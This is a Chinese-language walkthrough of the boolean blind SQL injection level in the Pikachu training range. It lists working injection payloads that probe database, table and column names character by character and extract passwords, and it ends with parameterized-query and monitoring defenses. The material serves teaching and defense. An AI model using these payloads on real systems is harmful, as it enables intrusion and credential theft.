# 布尔盲注(base on boolean) 通关笔记
> 从这一关开始，**页面不再显示数据了**。
>
> 你只能问它"是/不是"，然后一位一位地把数据问出来。
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | SQL-Inject → 盲注(base on boolian) |
| 页面地址 | `http://pikachu/vul/sqli/sqli_blind_b.php` |
| 提交方式 | GET |
| 参数名 | `name` |
| 目标 | 在没有回显的情况下，把数据读出来 |
页面和字符型注入长得一样，**但结果完全不同**：
| 输入 | 返回 |
| --- | --- |
| `kobe` | `your uid:3` + 邮箱 |
| `不存在的名字` | `您输入的username不存在` |
**只有真的查到了，才显示数据。** 这就是"盲注"的前提。
---
## 二、我的解题步骤
### 步骤 1：先确认有回显差异
输入 `kobe`：
```
your uid:3
your email is: kobe@pikachu.com
```
输入 `kobe' and 1=1#`：
```
your uid:3
your email is: kobe@pikachu.com
```
输入 `kobe' and 1=2#`：
```
您输入的username不存在，请重新输入！
```
**结果不一样！** 这就是布尔盲注的基础。
我实测：
| payload | 结果 |
| --- | --- |
| `kobe' and 1=1#` | **有结果** |
| `kobe' and 1=2#` | **无结果** |
### 步骤 2：把"真假"变成"问题"
既然 `and 后面放真条件 → 有结果`，那就可以问任意问题：
```sql
kobe' and length(database())>1#
```
- 有结果 → 数据库名长度 > 1
- 无结果 → 长度 ≤ 1
### 步骤 3：一位一位地猜
**猜数据库名长度：**
```
kobe' and length(database())=1#     → 无结果
kobe' and length(database())=2#     → 无结果
...
kobe' and length(database())=6#     → 有结果（假设是 pikachu）
```
**猜第一个字符的 ASCII：**
```
kobe' and ascii(substr(database(),1,1))>64#   → 有结果
kobe' and ascii(substr(database(),1,1))>100#  → 无结果
kobe' and ascii(substr(database(),1,1))>112#  → 无结果
kobe' and ascii(substr(database(),1,1))=112#  → 有结果
```
`112` = `p`，所以数据库名第一个字符是 `p`。
**重复这个过程，就能把整个库名、表名、字段名、数据全部"问"出来。**
### 步骤 4：手工太慢，上工具
手工猜一个 6 位字符串要发几十次请求。
实际会用：
- **Burp Intruder + 字典**（0~127 的 ASCII）
- **sqlmap**（`--technique=B`）
- **自己写脚本**（二分法最快）
---
## 三、原理分析
### 3.1 源码
```php
if(isset($_GET['submit']) && $_GET['name']!=null){
    $name=$_GET['name'];//这里没有做任何处理，直接拼到select里面去了
    $query="select id,email from member where username='$name'";//这里的变量是字符型，需要考虑闭合
    //mysqi_query不打印错误描述,即使存在注入,也不好判断
    $result=mysqli_query($link, $query);//
//     $result=execute($link, $query);
    if($result && mysqli_num_rows($result)==1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{
        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}
```
**关键改动：**
| 对比 | 普通字符型 | 布尔盲注 |
| --- | --- | --- |
| 查询函数 | `execute()`（会打印报错） | `mysqli_query()`（**不打印**） |
| 判断条件 | `num_rows>=1` | `num_rows==1` |
| 能否看到数据 | 能 | **只能看到'有/无'** |
作者注释：
> mysqi_query 不打印错误描述,即使存在注入,也不好判断
### 3.2 为什么 `num_rows()==1` 很重要
```php
if($result && mysqli_num_rows($result)==1){
```
**只有"恰好 1 行"才算查到。**
这意味着：
- `kobe' or 1=1#` → 7 行 → **不等于 1** → 显示"不存在"
- 想利用必须精确控制返回行数
**这让 `or 1=1` 这类"撞大运"的 payload 失效了。**
### 3.3 盲注的两种"信号"
| 信号 | 例子 | 说明 |
| --- | --- | --- |
| **有结果 / 无结果** | `and 1=1` vs `and 1=2` | 布尔盲注 |
| **快 / 慢** | `and sleep(2)` | 时间盲注 |
这一关用的是第一种。
---
## 四、知识点与笔记
### 4.1 布尔盲注能问哪些问题
| 目的 | payload |
| --- | --- |
| 库名长度 | `and length(database())=N#` |
| 库名第 N 位 | `and ascii(substr(database(),N,1))=M#` |
| 表数量 | `and (select count(*) from information_schema.tables where table_schema=database())=N#` |
| 表名第 N 位 | `and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),N,1))=M#` |
| 字段名 | 把 `table_name` 换成 `column_name`，查 `information_schema.columns` |
| 具体数据 | `and ascii(substr((select password from users limit 0,1),N,1))=M#` |
### 4.2 为什么用 ASCII 码
```sql
and ascii(substr(database(),1,1))=112
```
**直接比字符不方便**（引号嵌套麻烦），转成数字就简单了：
| 字符 | ASCII |
| --- | --- |
| `0`~`9` | 48~57 |
| `A`~`Z` | 65~90 |
| `a`~`z` | 97~122 |
### 4.3 二分法：把 128 次变成 7 次
猜一个字符，线性比要 128 次。用二分：
```
>64 ?  >96 ?  >112 ?  =108 ?  ...
```
**7 次就能定位一个字符（2^7 = 128）。**
### 4.4 常用函数速查
| 函数 | 作用 |
| --- | --- |
| `length(x)` | 长度 |
| `substr(x, pos, len)` | 截取 |
| `ascii(x)` | 转 ASCII |
| `database()` | 当前库名 |
| `user()` | 当前用户 |
| `version()` | 版本 |
| `@@datadir` | 数据目录 |
### 4.5 information_schema 是宝库
```sql
-- 所有表
select table_name from information_schema.tables where table_schema=database();
-- 某张表的字段
select column_name from information_schema.columns where table_name='users';
```
**盲注阶段，先摸结构（表名、列名），再取数据。**
---
## 五、和其他几关的区别
| 关卡 | 报错回显 | 数据回显 | 难度 |
| --- | --- | --- | --- |
| 数字型 / 字符型 | 有 | 有 | 低 |
| insert / update | 有 | 无 | 中 |
| **布尔盲注** | **无** | **只有真假** | **高** |
| 时间盲注 | 无 | 完全没有 | 最高 |
**盲注的关键不是"技术"，是"耐心 + 自动化"。**
---
## 六、防御怎么写
### 6.1 参数化
```php
$stmt = $link->prepare("select id,email from member where username=?");
$stmt->bind_param('s', $name);
$stmt->execute();
```
**参数化之后，`and 1=1` 只是字符串的一部分，不会改变逻辑。**
### 6.2 统一错误处理
```php
// 无论查询成功还是失败，返回同样的页面和状态码
```
**这一关的做法其实是对的**：`mysqli_query` 不打印报错、`num_rows==1` 才显示。
但**它只降低了"探测的便利性"，没有修掉漏洞本身**——盲注照样能打。
### 6.3 限流 + 监控
布尔盲注的特征：**同一个参数被高频请求，且返回结果高度相似。**
```text
?name=kobe' and ascii(substr(...,1,1))>64#
?name=kobe' and ascii(substr(...,1,1))>96#
?name=kobe' and ascii(substr(...,1,1))>112#
```
**对同一参数的异常高频访问做拦截/告警。**
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 没有回显时，用真假判断读数据 |
| 判断 | `and 1=1` 有结果，`and 1=2` 无结果 |
| 核心函数 | `length`、`substr`、`ascii` |
| 效率 | 二分法，7 次定位一个字符 |
| 修复 | 参数化（盲注也挡得住） |
**一句话**：
> **盲注不是"看不见"，是"一次只能问一个问题"——所以要把问题设计成是/非。**
---
## 参考
- [OWASP: Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
- [MySQL: information_schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema.html)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
